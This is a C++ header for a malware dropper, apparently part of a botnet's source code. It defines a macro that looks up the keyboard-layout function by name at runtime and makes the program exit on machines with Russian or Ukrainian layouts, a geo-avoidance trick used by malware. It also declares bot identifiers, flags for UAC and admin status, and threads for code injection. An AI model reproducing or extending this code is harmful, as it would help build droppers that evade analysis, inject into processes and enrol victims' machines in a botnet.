#ifndef _SDROPPER_H_
#define _SDROPPER_H_

#define DRPEXPORT// __declspec(dllexport)
#include "..\common\config.h"
namespace Drop
{
	#define DROP_EXP_MUTEX_ID	-3
	#define DROP_RUN_MUTEX_ID	-1
	#define DROP_MACHINEGUID	"z"
	#define DROP_MACHINESIGN	"c"

	#define RU_UA_RESTRICTION   { \
		Config::ReadConfig(); \
		typedef int (WINAPI *FNGetKeyboardLayoutList)(int nBuff, HKL *lpList); \
		CHAR functionName[30]; \
		Config::ReadString(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_GETKEYBOARD, functionName, RTL_NUMBER_OF(functionName)); \
		FNGetKeyboardLayoutList pGetKeyboardLayoutList = (FNGetKeyboardLayoutList)PeLdr::PeGetProcAddress(GetModuleHandleA("User32.dll"), functionName); \
		DWORD count = 0; \
		if(pGetKeyboardLayoutList) \
		{ \
			count = pGetKeyboardLayoutList(count, 0); \
			if(count)  \
			{ \
				DbgMsg(__FUNCTION__"(): count: %u\r\n", count); \
				HKL* hkl = (HKL*)malloc(sizeof(HKL) * count); \
				if(hkl) \
				{ \
					count = pGetKeyboardLayoutList(count, hkl); \
					for(int i=0;i<count;i++) {DbgMsg(__FUNCTION__"(): current id: 0x%X\r\n", LOWORD(hkl[i])); if(LOWORD(hkl[i]) == 0x0422 || LOWORD(hkl[i]) == 0x0419) {ExitProcess(0); __debugbreak();} } \
					free(hkl); \
				} \
			} \
		} \
		else {ExitProcess(0); __debugbreak();} \
	}

	extern CHAR MachineGuid[MAX_PATH];
	extern CHAR BotID[60];
	extern CHAR CurrentModulePath[MAX_PATH];
	extern CHAR CurrentConfigPath[MAX_PATH];
	extern PVOID CurrentImageBase;
	extern DWORD CurrentImageSize;
	extern BOOLEAN bFirstImageLoad;
	extern BOOLEAN bWorkThread;
	extern BOOLEAN g_bInject;
	extern CHAR g_chDllPath[MAX_PATH];
	extern BOOLEAN g_UAC;
	extern BOOLEAN g_Admin;
	extern DWORD IntegrityLevel;

	PCHAR GetMachineGuid();
	PCHAR GetBotID();
	VOID CreateInjectStartThread();
	DWORD InjectStartThread(PVOID Context);
};


#endif
